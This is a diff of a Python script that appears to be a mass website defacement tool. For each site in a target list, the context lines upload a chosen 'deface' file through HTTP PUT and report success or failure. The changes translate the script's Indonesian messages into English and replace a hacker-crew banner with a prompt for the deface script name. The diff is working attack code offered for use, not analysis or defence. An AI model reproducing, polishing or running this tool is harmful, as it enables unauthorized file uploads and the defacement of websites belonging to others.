@@ -44,7 +44,7 @@ def x(tetew):
       ipt = input(tetew)
    else:
       ipt = raw_input(tetew)
-   
+
    return str(ipt)
 
 def aox(script,target_file="target.txt"):
@@ -60,9 +60,9 @@ def aox(script,target_file="target.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" GAGAL GOBLOG!"+m+" ] %s/%s"%(site,script))
+               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
             else:
-               print(m+"["+h+" TERDEPES"+m+" ] %s/%s"%(site,script))
+               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
@@ -73,7 +73,7 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         a = x("~~ MrK3mpl03 | MrFath | Carlos | ArRose | Seven | GOTAKX ~~")
+         a = x("Enter your script deface name: ")
          if not os.path.isfile(a):
             print("file '%s' not found"%(a))
             continue
